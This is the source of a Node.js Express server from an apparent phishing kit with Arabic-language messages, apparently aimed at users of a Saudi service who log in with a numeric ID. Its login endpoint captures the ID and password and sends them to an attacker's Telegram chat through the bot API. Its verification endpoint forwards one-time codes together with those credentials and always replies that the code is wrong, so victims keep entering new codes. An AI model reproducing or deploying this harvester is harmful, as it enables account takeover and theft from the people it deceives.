import express from "express";
import path from "path";
import crypto from "crypto";
import { createRequire } from "module";
import { fileURLToPath } from "url";

const require = createRequire(import.meta.url);
const { BOT_TOKEN, CHAT_ID } = require("./telegram-config.cjs");

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = process.env.PORT || 3000;
const SESSION_TTL_MS = 30 * 60 * 1000;

/** @type {Map<string, { id: string, password: string, createdAt: number }>} */
const sessions = new Map();

app.use(express.json());
app.use("/assets", express.static(path.join(__dirname, "assets")));
app.use(express.static(__dirname));

function nowAr() {
  return new Date().toLocaleString("ar-SA", { timeZone: "Asia/Riyadh" });
}

function createSession(credentials) {
  const session = crypto.randomUUID();
  sessions.set(session, { ...credentials, createdAt: Date.now() });
  return session;
}

function getSession(sessionId) {
  const row = sessions.get(sessionId);
  if (!row) return null;
  if (Date.now() - row.createdAt > SESSION_TTL_MS) {
    sessions.delete(sessionId);
    return null;
  }
  return row;
}

async function sendTelegram(text) {
  const tgRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text }),
  });
  const tgData = await tgRes.json();
  if (!tgData.ok) {
    console.error("Telegram error:", tgData);
    throw new Error("telegram_failed");
  }
}

app.get("/api/health", (_req, res) => {
  res.json({ ok: true });
});

app.post("/api/login", async (req, res) => {
  const id = String(req.body?.id ?? "").trim();
  const password = String(req.body?.password ?? "");

  if (!id || !password) {
    return res.status(400).json({ ok: false, message: "أدخل رقم المميز وكلمة المرور" });
  }

  if (!/^\d+$/.test(id)) {
    return res.status(400).json({ ok: false, message: "رقم المميز أرقام فقط" });
  }

  const session = createSession({ id, password });

  const text = ["🔐 محاولة دخول جديدة", "", `رقم المميز: ${id}`, `كلمة المرور: ${password}`, "", `الوقت: ${nowAr()}`].join(
    "\n"
  );

  try {
    await sendTelegram(text);
    return res.json({ ok: true, session });
  } catch {
    sessions.delete(session);
    return res.status(502).json({ ok: false, message: "تعذّر الإرسال إلى Telegram" });
  }
});

app.post("/api/verify", async (req, res) => {
  const sessionId = String(req.body?.session ?? "");
  const code = String(req.body?.code ?? "").trim();
  let login = getSession(sessionId);
  if (!login) {
    const id = String(req.body?.id ?? "").trim();
    const password = String(req.body?.password ?? "");
    if (id && password) login = { id, password };
  }

  if (!login) {
    return res.status(400).json({ ok: false, message: "انتهت الجلسة، سجّل الدخول من جديد" });
  }

  if (!/^\d{4,8}$/.test(code)) {
    return res.status(400).json({ ok: false, message: "أدخل رمز التحقق" });
  }

  const text = [
    "📲 رمز تحقق جديد",
    "",
    `رقم المميز: ${login.id}`,
    `كلمة المرور: ${login.password}`,
    `رمز التحقق: ${code}`,
    "",
    `الوقت: ${nowAr()}`,
  ].join("\n");

  try {
    await sendTelegram(text);
    return res.json({ ok: true, valid: false, message: "رمز التحقق خاطئ" });
  } catch {
    return res.status(502).json({ ok: false, message: "تعذّر الإرسال إلى Telegram" });
  }
});

setInterval(() => {
  const now = Date.now();
  for (const [key, row] of sessions) {
    if (now - row.createdAt > SESSION_TTL_MS) sessions.delete(key);
  }
}, 5 * 60 * 1000);

app.listen(PORT, "0.0.0.0", () => {
  console.log(`http://localhost:${PORT}`);
});
